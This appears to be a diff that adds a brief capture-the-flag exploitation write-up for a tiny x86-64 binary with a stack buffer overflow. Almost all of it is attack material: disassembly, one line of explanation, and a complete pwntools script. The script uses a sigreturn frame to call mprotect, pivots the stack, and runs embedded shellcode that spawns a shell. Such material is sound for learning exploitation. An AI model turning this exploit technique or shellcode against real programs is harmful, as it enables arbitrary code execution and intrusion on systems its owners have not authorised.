@@ -1,0 +1,90 @@
+# Untitled
+
+```css
+Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
+
+```wasm
+_start:
+<+0>     push _write
+<+5>     mov rdi,0
+<+10>    mov rsi,rsp
+<+13>    sub rsi,8  ; bof offset = 8 bytes
+<+17>    mov rdx,300
+<+22>    mov rax,0
+<+27>    syscall    ; read(0, rsp-8, 300)
+<+29>    ret
+_write:
+<+0>     push _exit
+<+5>     mov rsi,rsp
+<+8>     sub rsi,8
+<+12>    mov rdx,8
+<+17>    mov rax,1
+<+22>    mov rdi,1
+<+27>    syscall    ; write(1, rsp-8, 8)
+<+29>    ret
+_exit:
+    mov rax,0x3c
+    syscall
+```
+
+Because of `NX enabled` , we will use `mprotect` to make a memory segment with a fixed address writable and executable, shift the stack to this address space, write shellcode on the stack, and execute it by returning to it
+
+```python
+# xpl.py
+from pwn import *
+
+def start(argv=[], *a, **kw):
+  return process([exe] + argv, *a, **kw)
+
+def sigreturn_mprotect():
+	frame = SigreturnFrame()
+	frame.rax = constants.SYS_mprotect # 0xa
+	frame.rdi = writable
+	frame.rsi = 0x1000
+	frame.rdx = 0x7	# mode (rwx)
+	frame.rsp = new_ret # new stack area
+	frame.rip = syscall_ret
+	return bytes(frame)
+	
+exe = './pwn'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'info'
+
+shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+bof_offset = 8
+
+syscall_ret = elf.sym._start + 27
+read_ret = elf.sym._start + 17
+# the 0x400000 memory area executable and writable 
+# to allow shellcode execution at a known address
+writable = 0x400000
+new_ret = 0x400018
+
+p = start()
+# 1
+payload = flat({
+	bof_offset: [
+		read_ret, # ret here to fix rax = 0xf by read
+		syscall_ret,
+		sigreturn_mprotect(),
+	]
+})
+p.send(payload)
+p.send(b'A' * constants.SYS_rt_sigreturn)
+
+# 2
+payload = flat({
+	bof_offset:[
+		new_ret+8,
+		shellcode,
+	]
+})
+
+p.send(payload)
+p.interactive()
+```
